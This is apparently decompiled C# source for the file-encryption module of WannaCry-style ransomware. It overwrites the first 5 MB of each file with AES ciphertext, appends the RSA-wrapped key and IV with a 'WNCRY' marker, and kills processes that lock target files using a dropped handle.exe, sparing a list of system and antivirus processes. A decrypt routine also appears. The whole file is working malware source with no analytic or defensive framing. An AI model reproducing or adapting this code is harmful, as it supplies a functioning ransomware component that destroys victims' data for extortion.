using ed.Properties;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace ed
{
	public static class CryptoFile
	{
		private static string[] _exProcesses = new string[]
		{
			"lsm.exe",
			"csrss.exe",
			"dwm.exe",
			"smss.exe",
			"lsass.exe",
			"wuauclt.exe",
			"services.exe",
			"svchost.exe",
			"taskhost.exe",
			"winlogon.exe",
			"wininit.exe",
			"conhost.exe",
			"explorer.exe",
			"spoolss.exe",
			"spoolsv.exe",
			"system.exe",
			"avp.exe",
			"avpui.exe",
			"ekrn.exe",
			"egui.exe",
			"mfemmc.exe",
			"mfefire.exe",
			"mfevtps.exe",
			"pefservice.exe",
			"mcsvhost.exe",
			"msascui.exe",
			"msmpeng.exe",
			"mpcmdrun.exe",
			"avshadow.exe",
			"avguard.exe",
			"avgnt.exe"
		};

		public static long CRYPT_BYTES = 5242880L;

		private static bool IsFileLocked(string path)
		{
			bool result;
			try
			{
				using (File.Open(path, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
				{
					result = false;
				}
			}
			catch (IOException)
			{
				result = true;
			}
			return result;
		}

		private static bool KillFileLockProcess(string path)
		{
			bool result;
			try
			{
				if (!File.Exists("handle.exe"))
				{
					File.WriteAllBytes("handle.exe", Resources.handle);
				}
				string arg_3C_0 = PS.ExecuteAndWait("handle.exe", "\"" + path + "\" -accepteula -nobanner");
				string pattern = "(?<=\\s+pid:\\s+)\\b(\\d+)\\b(?=\\s+)";
				using (IEnumerator enumerator = Regex.Matches(arg_3C_0, pattern).GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						Process processById = Process.GetProcessById(int.Parse(((Match)enumerator.Current).Value));
						bool flag = false;
						string[] exProcesses = CryptoFile._exProcesses;
						for (int i = 0; i < exProcesses.Length; i++)
						{
							string text = exProcesses[i];
							if (processById.MainModule.ModuleName.ToLower() == text.ToLower())
							{
								flag = true;
								break;
							}
						}
						if (!flag)
						{
							processById.Kill();
							processById.WaitForExit(10000);
						}
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		public static bool Encrypt(string path, byte[] publicKeyBlob)
		{
			try
			{
				if (!File.Exists(path))
				{
					bool result = false;
					return result;
				}
				if (CryptoFile.IsFileLocked(path))
				{
					CryptoFile.KillFileLockProcess(path);
				}
				using (FileStream fileStream = File.Open(path, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
				{
					if (fileStream.Length > 512L)
					{
						byte[] array = new byte[5];
						fileStream.Seek(-5L, SeekOrigin.End);
						fileStream.Read(array, 0, array.Length);
						if (Encoding.ASCII.GetString(array) == "WNCRY")
						{
							bool result = false;
							return result;
						}
						fileStream.Seek(0L, SeekOrigin.Begin);
					}
					if (fileStream.Length < 16L)
					{
						fileStream.SetLength(16L);
					}
					byte[] array2 = new byte[(fileStream.Length > CryptoFile.CRYPT_BYTES) ? CryptoFile.CRYPT_BYTES : (fileStream.Length >> 4 << 4)];
					fileStream.Read(array2, 0, array2.Length);
					AESKey aESKey = new AESKey();
					byte[] array3 = AES.Encrypt(aESKey.Key, aESKey.IV, array2);
					byte[] array4 = RSA.Encrypt(publicKeyBlob, aESKey.Key);
					byte[] array5 = RSA.Encrypt(publicKeyBlob, aESKey.IV);
					fileStream.Seek(0L, SeekOrigin.Begin);
					fileStream.Write(array3, 0, array3.Length);
					fileStream.Seek(0L, SeekOrigin.End);
					fileStream.Write(array4, 0, array4.Length);
					fileStream.Write(array5, 0, array5.Length);
					fileStream.Write(Encoding.ASCII.GetBytes("WNCRY"), 0, 5);
					fileStream.Flush();
				}
			}
			catch
			{
				bool result = false;
				return result;
			}
			return true;
		}

		public static bool Decrypt(string path, byte[] privateKeyBlob)
		{
			try
			{
				using (FileStream fileStream = File.Open(path, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
				{
					if (fileStream.Length < 512L)
					{
						bool result = false;
						return result;
					}
					byte[] array = new byte[5];
					fileStream.Seek(-5L, SeekOrigin.End);
					fileStream.Read(array, 0, array.Length);
					if (Encoding.ASCII.GetString(array) != "WNCRY")
					{
						bool result = false;
						return result;
					}
					fileStream.Seek(-517L, SeekOrigin.End);
					byte[] array2 = new byte[256];
					byte[] array3 = new byte[256];
					fileStream.Read(array2, 0, array2.Length);
					fileStream.Read(array3, 0, array3.Length);
					byte[] arg_FE_0 = RSA.Decrypt(privateKeyBlob, array2);
					byte[] iv = RSA.Decrypt(privateKeyBlob, array3);
					fileStream.SetLength(fileStream.Length - 517L);
					fileStream.Seek(0L, SeekOrigin.Begin);
					byte[] array4 = new byte[(fileStream.Length > CryptoFile.CRYPT_BYTES) ? CryptoFile.CRYPT_BYTES : (fileStream.Length >> 4 << 4)];
					fileStream.Read(array4, 0, array4.Length);
					byte[] array5 = AES.Decrypt(arg_FE_0, iv, array4);
					fileStream.Seek(0L, SeekOrigin.Begin);
					fileStream.Write(array5, 0, array5.Length);
					fileStream.Flush();
				}
			}
			catch
			{
				bool result = false;
				return result;
			}
			return true;
		}
	}
}
